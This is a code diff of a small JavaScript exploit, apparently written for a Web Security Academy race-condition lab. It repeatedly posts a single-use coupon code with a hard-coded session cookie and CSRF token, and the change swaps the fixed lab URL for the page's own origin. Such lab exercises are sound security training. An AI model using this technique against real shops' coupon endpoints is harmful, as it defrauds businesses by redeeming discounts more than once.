@@ -21,7 +21,7 @@ sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
 sp.append("coupon", "PROMO20");
 function applyCoupon() {
   return fetch(couponForm.action, {
-    method: "post",
+    method: "POST",
     headers: {
       "Content-Type": "application/x-www-form-urlencoded",
     },
@@ -50,17 +50,14 @@ const sp = new URLSearchParams();
 sp.append("csrf", "hJBGfUUwkgeehlxTw7z4T2IuBGB7nBOy");
 sp.append("coupon", "PROMO20");
 function applyCoupon() {
-  return fetch(
-    "https://0a1c00990378dd4680117b6b00a700ae.web-security-academy.net/cart/coupon",
-    {
-      method: "post",
-      headers: {
-        "Content-Type": "application/x-www-form-urlencoded",
-        Cookie: "session=oQf2bCYK3mMzTQnM3OP1YuZbr6mNFlen",
-      },
-      body: sp.toString(),
+  return fetch(`${location.origin}/cart/coupon`, {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/x-www-form-urlencoded",
+      Cookie: "session=oQf2bCYK3mMzTQnM3OP1YuZbr6mNFlen",
     },
-  );
+    body: sp.toString(),
+  });
 }
 applyCoupon();
 applyCoupon();
